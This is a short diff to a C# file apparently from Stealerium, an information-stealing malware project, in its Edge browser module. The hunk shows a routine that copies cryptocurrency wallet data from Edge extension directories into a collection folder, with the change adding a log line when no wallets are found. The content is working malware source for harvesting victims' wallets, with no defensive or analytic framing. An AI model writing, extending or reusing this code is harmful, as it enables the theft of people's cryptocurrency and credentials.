@@ -84,7 +84,11 @@ namespace Stealerium.Target.Browsers.Edge
                 Directory.CreateDirectory(sSaveDir);
 
                 foreach (var array in EdgeWalletsDirectories) CopyWalletFromDirectoryTo(sSaveDir, array[1], array[0]);
-                if (Counter.BrowserWallets == 0) Filemanager.RecursiveDelete(sSaveDir);
+                if (Counter.BrowserWallets == 0)
+                {
+                    Filemanager.RecursiveDelete(sSaveDir);
+                    Logging.Log("Edge Browser Wallets >> No wallets from Edge browser\n");
+                }
             }
             catch (Exception ex)
             {
